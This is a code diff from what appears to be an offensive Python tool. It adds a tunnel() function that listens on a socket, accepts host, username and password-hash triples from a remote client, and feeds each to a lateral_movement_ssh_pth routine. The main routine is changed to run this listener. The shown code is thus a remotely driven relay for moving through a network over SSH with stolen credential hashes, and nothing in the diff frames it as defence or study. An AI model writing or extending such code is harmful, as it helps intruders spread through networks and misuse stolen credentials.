@@ -51,8 +51,41 @@ def lateral_movement_ssh_pth(target_host, target_username, target_password_hash)
     except paramiko.ssh_exception.NoValidConnectionsError as e:
         print("Error connecting to SSH server:", str(e))
 
-
+def tunnel():
+    # Create a TCP/IP socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    # Bind the socket to a specific address and port
+    server_address = ('localhost', 1234)  # Update with your desired address and port
+    server_socket.bind(server_address)
+    
+    # Listen for incoming connections
+    server_socket.listen(1)
+    print("Waiting for connection...")
+    
+    while True:
+        # Accept a connection
+        client_socket, client_address = server_socket.accept()
+        print("Connected from:", client_address)
+        
+        try:
+            while True:
+                # Receive data from the client
+                data = client_socket.recv(1024).decode()
+                
+                if data:
+                    # Pass the received data to the lateral movement function
+                    target_host, target_username, target_password_hash = data.split(",")
+                    lateral_movement_ssh_pth(target_host, target_username, target_password_hash)
+                else:
+                    # No more data, break the loop
+                    break
+        finally:
+            # Clean up the connection
+            client_socket.close()
+            
 # Function to calculate checksum
+
 def calculate_checksum(data):
     if len(data) % 2 == 1:
         data += b'\x00'
@@ -910,7 +943,7 @@ copy_existing_files:
     url = "https://www.example.com"
     title, link_urls = fetch_html_content(url)
 
-    lateral_movement_ssh_pth(destination, "target_username", "target_password_hash")
+    tunnel()
 
     if title and link_urls:
         print("Title:", title)
